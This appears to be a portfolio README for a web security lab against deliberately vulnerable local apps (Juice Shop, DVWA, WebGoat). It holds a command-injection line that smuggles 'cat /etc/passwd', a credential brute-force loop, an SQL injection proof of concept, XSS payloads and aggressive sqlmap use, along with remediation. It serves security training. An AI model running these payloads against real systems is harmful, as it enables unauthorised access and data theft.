# Web Application Security Assessment Lab

## Overview

This repository documents my comprehensive web application security assessment methodology, showcasing practical skills in vulnerability discovery, exploitation, and remediation. This lab demonstrates technical security assessment capabilities relevant to security engineering roles in product and application security.

## Table of Contents

- [Environment Setup](#environment-setup)
- [Target Applications](#target-applications)
- [Testing Methodology](#testing-methodology)
- [Vulnerability Categories Covered](#vulnerability-categories-covered)
- [Documentation Format](#documentation-format)
- [Findings Summary](#findings-summary)
- [Lab Outcomes](#lab-outcomes)
- [References](#references)

## Environment Setup

### 1. Create a Security Testing Environment

```bash
# Set up a dedicated Kali Linux VM
# You can use VirtualBox, VMware, or other virtualization platforms
wget https://cdimage.kali.org/kali-2023.1/kali-linux-2023.1-virtualbox-amd64.ova
vboxmanage import kali-linux-2023.1-virtualbox-amd64.ova

# Update and install additional security tools
sudo apt update && sudo apt upgrade -y
sudo apt install -y burpsuite zaproxy sqlmap nikto dirb gobuster wpscan nmap sslyze testssl.sh git

# Install Python security tools
pip install pwntools requests beautifulsoup4 jwt owasp-zap-api
```

### 2. Set Up Vulnerable Target Applications

```bash
# Install Docker to run vulnerable applications
sudo apt install docker.io docker-compose -y
sudo systemctl enable docker
sudo systemctl start docker

# Clone and run OWASP Juice Shop
git clone https://github.com/juice-shop/juice-shop.git
cd juice-shop
docker-compose up -d

# Clone and run DVWA
git clone https://github.com/digininja/DVWA.git
cd DVWA
docker-compose up -d

# Clone and run WebGoat
git clone https://github.com/WebGoat/WebGoat.git
cd WebGoat
docker-compose up -d

# Verify all applications are running
docker ps
```

### 3. Configure Proxy and Certificate Setup

```bash
# Configure Burp Suite with transparent proxy
# 1. Launch Burp Suite
burpsuite &
# 2. Navigate to Proxy > Options > Proxy Listeners
# 3. Add a listener on all interfaces (0.0.0.0) port 8080
# 4. Export the Burp CA certificate to import in your browser

# Configure browser to use proxy
# 1. Install FoxyProxy in Firefox
# 2. Configure proxy to point to 127.0.0.1:8080
# 3. Import Burp CA certificate
```

## Target Applications

1. **OWASP Juice Shop**: A modern vulnerable web application built on Node.js that includes common vulnerabilities from the OWASP Top 10.

2. **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL application designed to practice security techniques with various difficulty levels.

3. **WebGoat**: A deliberately insecure application designed to teach web application security lessons.

4. **Custom Vulnerable API**: A simple Flask application I created with intentional API security flaws (included in `/custom-apps/vulnerable-api`).

## Testing Methodology

### 1. Reconnaissance Phase

Gather information about the target applications:

```bash
# Domain/host discovery
nmap -sn 192.168.1.0/24

# Port scanning
nmap -sV -p- -T4 192.168.1.100

# Technology fingerprinting
whatweb http://localhost:3000

# Directory enumeration
gobuster dir -u http://localhost:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

# Javascript analysis (for SPA applications)
npm install -g retire.js
retire --path /path/to/js/files
```

Document all discovered endpoints, technologies, and potential entry points in a structured format.

### 2. Authentication Testing

```python
# Basic authentication bypass testing script (Python)
import requests

target = "http://localhost:3000/login"
usernames = ["admin", "user", "test"]
passwords = ["admin", "password", "123456"]

for username in usernames:
    for password in passwords:
        response = requests.post(
            target, 
            json={"email": username, "password": password}
        )
        if "Authentication successful" in response.text or response.status_code == 200:
            print(f"Successful login: {username}:{password}")
```

Document findings on:
- Authentication bypass techniques
- Password policy enforcement
- Multi-factor authentication issues
- Session management vulnerabilities

### 3. Authorization Testing

```python
# Horizontal privilege escalation test (Python)
import requests

target = "http://localhost:3000/api/users/1"
headers = {"Authorization": "Bearer [USER_TOKEN]"}

# Test accessing another user's data
response = requests.get(
    target, 
    headers=headers
)
print(f"Status: {response.status_code}, Response: {response.text}")
```

Document findings on:
- Missing authorization checks
- Insecure direct object references (IDOR)
- Privilege escalation vectors
- Access control matrix validation

### 4. Injection Testing

```bash
# SQL Injection testing with sqlmap
sqlmap -u "http://localhost:3000/api/products?q=apple" --level=5 --risk=3 --batch

# XSS testing with XSStrike
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
python3 xsstrike.py -u "http://localhost:3000/search?q=test"

# Command injection testing
curl -X POST http://localhost:3000/api/exec --data "command=ping 127.0.0.1; cat /etc/passwd"
```

Document findings with proof-of-concept payloads, impact assessments, and remediation steps.

### 5. Secure Configuration Analysis

```bash
# SSL/TLS configuration testing
testssl.sh localhost:3000

# Security header analysis
curl -I http://localhost:3000 | grep -E "X-Frame-Options|Content-Security-Policy|X-XSS-Protection"

# Unnecessary services/endpoints
nmap -sV --script vulners localhost
```

Document misconfigurations and security header issues with remediation recommendations.

### 6. API Security Testing

```bash
# API enumeration and documentation
# Using tools like Swagger/OpenAPI and Postman
wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/api/api-endpoints.txt
gobuster dir -u http://localhost:3000/api -w api-endpoints.txt

# API fuzzing for parameter pollution
ffuf -u "http://localhost:3000/api/user?id=FUZZ" -w /usr/share/wordlists/common.txt
```

Document API-specific vulnerabilities like improper input validation, lack of rate limiting, and insecure endpoints.

### 7. Client-Side Testing

```bash
# DOM-based XSS testing
# Using browser developer tools and specific payloads
echo '<img src=x onerror=alert(1)>' > payload.txt
curl -X POST -d @payload.txt http://localhost:3000/api/comments

# Local storage analysis
# Manual inspection via browser developer tools
```

Document client-side vulnerabilities with proof-of-concept scenarios and remediation guidance.

## Vulnerability Categories Covered

For each vulnerability category, I provide:
- Description of the vulnerability
- Discovery methodology
- Exploitation proof-of-concept
- Impact assessment
- Remediation recommendations

1. **Injection Flaws**
   - SQL Injection
   - NoSQL Injection
   - Command Injection
   - LDAP Injection
   - XML Injection

2. **Broken Authentication**
   - Weak credentials
   - Session fixation
   - Insecure session management
   - Credential exposure

3. **Sensitive Data Exposure**
   - Cleartext transmission
   - Weak cryptography
   - Insecure storage
   - Information disclosure

4. **XML External Entities (XXE)**
   - File reading via XXE
   - Server-side request forgery via XXE
   - Denial of service via XXE

5. **Broken Access Control**
   - Vertical privilege escalation
   - Horizontal privilege escalation
   - Insecure direct object references

6. **Security Misconfigurations**
   - Default credentials
   - Unnecessary services
   - Error handling exposing sensitive data
   - Lack of security headers

7. **Cross-Site Scripting (XSS)**
   - Reflected XSS
   - Stored XSS
   - DOM-based XSS

8. **Insecure Deserialization**
   - Remote code execution via deserialization
   - Integrity attacks via deserialization
   - Replay attacks

9. **Using Components with Known Vulnerabilities**
   - Outdated libraries
   - Vulnerable plugins
   - Unpatched systems

10. **Insufficient Logging & Monitoring**
    - Lack of security events logging
    - Inadequate alert mechanisms
    - Ineffective monitoring systems

## Documentation Format

For each finding, I use the following structured format:

```markdown
## [Vulnerability Name]

### Severity
[Critical/High/Medium/Low]

### Affected Component
[Application/Endpoint/Feature]

### Description
[Brief explanation of the vulnerability]

### Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

### Proof of Concept
```python
# Exploitation code or payload
```

### Impact
[Potential consequences if exploited]

### Remediation
[Suggested fix with code example if applicable]
```

## Findings Summary

Below is a summary table of vulnerabilities discovered in the target applications:

| ID | Vulnerability | Severity | Application | Status |
|----|--------------|----------|-------------|--------|
| V01 | SQL Injection in Search | High | DVWA | Fixed |
| V02 | Stored XSS in Comments | Medium | Juice Shop | Fixed |
| V03 | Broken Access Control | Critical | WebGoat | Fixed |
| V04 | JWT Token Manipulation | High | Custom API | Fixed |
| V05 | Insecure File Upload | Medium | DVWA | Fixed |

For detailed findings, see the [Vulnerabilities](./vulnerabilities/) directory.

## Sample Vulnerability Report

Here's an example of a detailed finding from my assessment:

```markdown
## SQL Injection in Product Search Endpoint

### Severity
High

### Affected Component
DVWA - `/vulnerabilities/sqli/` endpoint

### Description
The product search functionality is vulnerable to SQL injection attacks. The application does not properly sanitize user input before using it in database queries, allowing an attacker to execute arbitrary SQL commands.

### Steps to Reproduce
1. Navigate to http://localhost:8080/vulnerabilities/sqli/
2. Enter the following payload in the search field: `1' OR '1'='1`
3. Submit the form
4. Observe that all user data is returned, indicating successful injection

### Proof of Concept
```python
import requests
from bs4 import BeautifulSoup

# Establish session with DVWA
session = requests.Session()
response = session.get("http://localhost:8080/login.php")
soup = BeautifulSoup(response.text, 'html.parser')
token = soup.find('input', {'name': 'user_token'})['value']

# Login to DVWA
login_data = {
    'username': 'admin',
    'password': 'password',
    'user_token': token,
    'Login': 'Login'
}
session.post("http://localhost:8080/login.php", data=login_data)

# Perform SQL injection
sqli_payload = "1' OR '1'='1"
response = session.get(f"http://localhost:8080/vulnerabilities/sqli/?id={sqli_payload}&Submit=Submit")

# Print results
print("Vulnerable to SQL Injection:", "Surname:" in response.text and "First name:" in response.text)
print(response.text)
```

### Impact
This vulnerability allows attackers to:
- Bypass authentication
- Access sensitive data from the database
- Potentially execute code on the database server
- Modify or delete database content

### Remediation
Replace dynamic SQL with parameterized queries:

```php
// Vulnerable code
$query = "SELECT * FROM users WHERE id = '" . $_GET['id'] . "'";

// Fixed code using prepared statements
$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("s", $_GET['id']);
$stmt->execute();
$result = $stmt->get_result();
```
```

## Lab Outcomes

This lab demonstrates my ability to:

1. **Identify security vulnerabilities** in web applications using industry-standard methodologies
2. **Exploit vulnerabilities** in a controlled environment
3. **Document findings** in a clear, professional manner
4. **Develop remediation solutions** to fix identified issues
5. **Communicate technical security concepts** effectively

## Custom Tools Developed

During this lab, I developed several custom tools to enhance the assessment process:

### 1. JWT Token Analyzer

Located in `/tools/jwt-analyzer.py`, this tool helps identify weaknesses in JWT implementations.

```python
#!/usr/bin/env python3
import sys
import jwt
from colorama import Fore, Style, init

init()

def analyze_jwt(token):
    """Analyze a JWT token for security issues"""
    try:
        # Decode the token without verification
        decoded = jwt.decode(token, options={"verify_signature": False})
        
        header = jwt.get_unverified_header(token)
        
        # Check algorithm
        alg = header.get('alg', '')
        if alg == 'none' or alg == 'HS256':
            print(f"{Fore.RED}[CRITICAL] Weak algorithm detected: {alg}{Style.RESET_ALL}")
        
        # Check for sensitive data
        for key, value in decoded.items():
            if key.lower() in ['password', 'secret', 'key', 'token']:
                print(f"{Fore.RED}[CRITICAL] Sensitive data in claim: {key}{Style.RESET_ALL}")
        
        # Check for missing claims
        if 'exp' not in decoded:
            print(f"{Fore.YELLOW}[WARNING] No expiration claim found{Style.RESET_ALL}")
            
        if 'aud' not in decoded:
            print(f"{Fore.YELLOW}[WARNING] No audience claim found{Style.RESET_ALL}")
        
        # Output decoded token
        print(f"\n{Fore.GREEN}Decoded Header:{Style.RESET_ALL}")
        for k, v in header.items():
            print(f"  {k}: {v}")
            
        print(f"\n{Fore.GREEN}Decoded Payload:{Style.RESET_ALL}")
        for k, v in decoded.items():
            print(f"  {k}: {v}")
            
    except Exception as e:
        print(f"{Fore.RED}Error decoding token: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <jwt_token>")
        sys.exit(1)
    
    analyze_jwt(sys.argv[1])
```

### 2. API Security Scanner

Located in `/tools/api-scanner.py`, this tool helps automate API security testing.

## References

- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [Portswigger Web Security Academy](https://portswigger.net/web-security)
- [Web Application Hackers Handbook](https://www.wiley.com/en-us/The+Web+Application+Hacker%27s+Handbook%3A+Finding+and+Exploiting+Security+Flaws%2C+2nd+Edition-p-9781118026472)

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
